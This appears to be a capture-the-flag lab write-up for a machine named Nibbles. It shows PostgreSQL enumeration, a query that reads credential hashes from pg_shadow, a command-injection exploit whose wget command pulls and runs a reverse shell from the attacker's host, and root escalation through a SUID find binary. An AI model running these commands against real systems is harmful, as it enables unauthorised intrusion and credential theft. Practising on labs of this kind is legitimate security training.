---
description: SUID misconfiguration in `find` binary led to privEsc
icon: linux
---

# Nibbles

## Summary

* PostgreSQL running on **non-standard port 5437** with **unauthenticated access**.
* SQL enumeration revealed usernames and allowed **RCE via command injection** (CVE-2022-2625).
* Reverse shell established as `postgres`.
* Privilege escalation via **SUID misconfiguration** using `find` binary to get a root shell.



## 🧵 Let's Unpack

#### 🔍 Enumeration

```bash
sudo nmap -A -T4 -sC -sN -oN nmapFull -p 21,22,80,139,445,5437 192.168.197.47
```

* **5437/tcp** → PostgreSQL 11.3
* **21/ftp** → Anonymous login allowed but no file listing
* **80/http** → Apache/2.4.38 with default landing page
* **139/445** → SMB open but filtered

#### 🐘 PostgreSQL Enumeration & Exploitation

```bash

# connecting with default password
psql -h 192.168.197.47 -p 5437 -U postgres

# Commands
\list # list db
\c <database> # use the db
\d # list tables
\du # get user roles

SELECT user # get current user

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```

Found valid users:

* `postgres`, `root`, `wilson`

Used [Exploit-DB 50847](https://www.exploit-db.com/exploits/50847) for **command injection**.

**Exploit Chain:**

```bash
# Local payload to trigger reverse shell
python 50847.py -i 192.168.197.47 -p 5437 -c 'wget http://192.168.45.175/shell -O /tmp/shell'
python 50847.py -i 192.168.197.47 -p 5437 -c 'chmod +x /tmp/shell'
python 50847.py -i 192.168.197.47 -p 5437 -c '/tmp/shell'

# Start listener on attack box
nc -nlvp 445
```

* Reverse shell established as user: `postgres`
* Upgraded with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

***

## Privilege Escalation

* Ran **linpeas.sh**, which revealed:
  * Apache running as **root**
  * Interesting cron jobs and SUID binaries
  * `/usr/bin/find` has **SUID bit set**

<details>

<summary>Linpeas results</summary>

```
# Apache is running as root, can we leverage it for pic esclaation?

# crontab has a lot of stuff
/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Apr 27  2020 .
drwxr-xr-x 82 root root 4096 Jul 20  2020 ..
-rwxr-xr-x  1 root root  539 Apr  2  2019 apache2
-rwxr-xr-x  1 root root 1478 May 28  2019 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
-rw-r--r--  1 root root  102 Jun 23  2019 .placeholder
-rwxr-xr-x  1 root root  383 Sep  2  2019 samba
-rwxr-xr-x  1 root root  441 Apr  6  2019 sysstat

# interesting files
/etc/mysql/mariadb.cnf 
/etc/postgresql/11/main/pg_hba.conf

/etc/postgresql/11/main/postgresql.conf
/usr/lib/tmpfiles.d/postgresql.conf


/root/proof.txt

root postgres


# SUID binaries
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                              
                      ╚════════════════════════════════════╝                                                                                                                    
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                
strings Not Found                                                                                                                                                               
strace Not Found                                                                                                                                                                
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                                                                                       
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Jan  7  2019 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
-rwsr-xr-x 1 root root 154K Feb  2  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
```

</details>

**Used `find` SUID trick to escalate:**

```bash
sudo install -m =xs $(which find) .   # enable suid
find . -exec /bin/sh -p \; -quit
```

✅ Root shell achieved.

***



